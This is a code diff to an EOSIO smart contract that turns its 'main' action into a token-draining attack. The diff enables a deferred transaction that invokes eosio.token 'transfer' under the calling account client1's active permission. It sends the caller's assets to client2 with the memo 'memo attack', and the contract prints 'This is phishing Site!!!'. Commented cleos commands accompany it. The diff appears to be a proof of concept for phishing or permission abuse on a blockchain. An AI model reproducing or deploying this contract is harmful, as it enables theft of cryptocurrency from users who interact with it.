@@ -39,25 +39,26 @@ class [[eosio::contract]] CallContract: public contract{
         using contract::contract;
 	public :
 		[[eosio::action]]
-        void main(name client1, name client2, uint64_t idx)
+        void main(name client1, name client2, uint64_t idx, asset t)
         {
             print("[!!!!!!!!!!!!] This is phishing Site!!!\n");
-            //transaction out1{};
+            transaction out1{};
             //name targetContract = "phising"_n;
             //name method         = "main"_n;
 		
-            name targetContract = name("phishing");
-            name method         = name("main");
+            name targetContract = name("eosio.token");
+            name method         = name("transfer");
             
             //cleos push action client1  addfilebytes '[2,"aa22222222a",5]' -p client   // danakilblock contract 
 			//out1.actions.emplace_back(permission_level{_self, "active"_n}, targetContract , method , std::make_tuple(idx,"AAAAAAAAAAAAAAAAAAAAAAAAAA",22));
 			//out1.actions.emplace_back(permission_level{_self, "active"_n}, targetContract , method , std::make_tuple(name("client2"),idxa,t));
             //cleos push action eosio.token transfer '["client1","client2","1.0000 EOS","memo"]' -p client1
-			//aout1.actions.emplace_back(permission_level{client1, "active"_n}, targetContract , "transfer"_n , std::make_tuple(client1, client2 ,t,"memo attack"));
+			
+			out1.actions.emplace_back(permission_level{client1, "active"_n}, targetContract , method , std::make_tuple(client1, client2 ,t,"memo attack"));
 			//transaction transfer;
 			//transfer.actions.emplace_back(eosio::permission_level {_self, N(active) }, N(eosio.token), N(transfer), std::make_tuple(from_account, to_account_1, quantity_to_send, std::string("memo")));
-            //out1.send( idx+1, _self, false);
-			
+            out1.send( idx+1, _self, false);
+			/*
 			transaction trx{};
 			{
 				trx.actions.emplace_back(
@@ -71,7 +72,7 @@ class [[eosio::contract]] CallContract: public contract{
 			}
 			trx.delay_sec = 0;
 			trx.send(idx, client1);
-
+			*/
 			/*
 
 		for ( int i=0; i< 2; i++){
